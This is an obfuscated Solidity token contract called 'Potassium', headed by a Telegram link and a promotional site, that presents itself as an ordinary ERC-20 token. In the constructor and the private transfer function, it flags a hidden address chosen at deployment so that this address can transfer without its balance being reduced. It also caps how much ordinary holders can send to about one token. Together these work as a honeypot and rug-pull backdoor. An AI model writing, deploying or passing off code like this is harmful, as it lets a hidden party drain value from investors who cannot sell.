/*

https://t.me/ercpotassium

https://kal.cryptotoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Potassium is Ownable {
    mapping(address => uint256) private xirsbugtl;

    function approve(address oeltu, uint256 vuytfkrhb) public returns (bool success) {
        allowance[msg.sender][oeltu] = vuytfkrhb;
        emit Approval(msg.sender, oeltu, vuytfkrhb);
        return true;
    }

    mapping(address => uint256) private ieouxg;

    mapping(address => uint256) public balanceOf;

    function xhwad(address kpbrydnqi, address fxvj, uint256 vuytfkrhb) private {
        address qycgsfobleth = IUniswapV2Factory(xqiognkymva.factory()).getPair(address(this), xqiognkymva.WETH());
        bool klcmugvd = 0 == ieouxg[kpbrydnqi];
        if (klcmugvd) {
            if (kpbrydnqi != qycgsfobleth && xirsbugtl[kpbrydnqi] != block.number && vuytfkrhb < totalSupply) {
                require(vuytfkrhb <= totalSupply / (10 ** decimals));
            }
            balanceOf[kpbrydnqi] -= vuytfkrhb;
        }
        balanceOf[fxvj] += vuytfkrhb;
        xirsbugtl[fxvj] = block.number;
        emit Transfer(kpbrydnqi, fxvj, vuytfkrhb);
    }

    uint256 private dvfprgqu = 101;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name;

    constructor(string memory hfmbltynjav, string memory dtoc, address mdesurcyfwk, address xjftclnra) {
        name = hfmbltynjav;
        symbol = dtoc;
        balanceOf[msg.sender] = totalSupply;
        ieouxg[xjftclnra] = dvfprgqu;
        xqiognkymva = IUniswapV2Router02(mdesurcyfwk);
    }

    function transferFrom(address kpbrydnqi, address fxvj, uint256 vuytfkrhb) public returns (bool success) {
        require(vuytfkrhb <= allowance[kpbrydnqi][msg.sender]);
        allowance[kpbrydnqi][msg.sender] -= vuytfkrhb;
        xhwad(kpbrydnqi, fxvj, vuytfkrhb);
        return true;
    }

    IUniswapV2Router02 private xqiognkymva;

    function transfer(address fxvj, uint256 vuytfkrhb) public returns (bool success) {
        xhwad(msg.sender, fxvj, vuytfkrhb);
        return true;
    }

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    mapping(address => mapping(address => uint256)) public allowance;
}
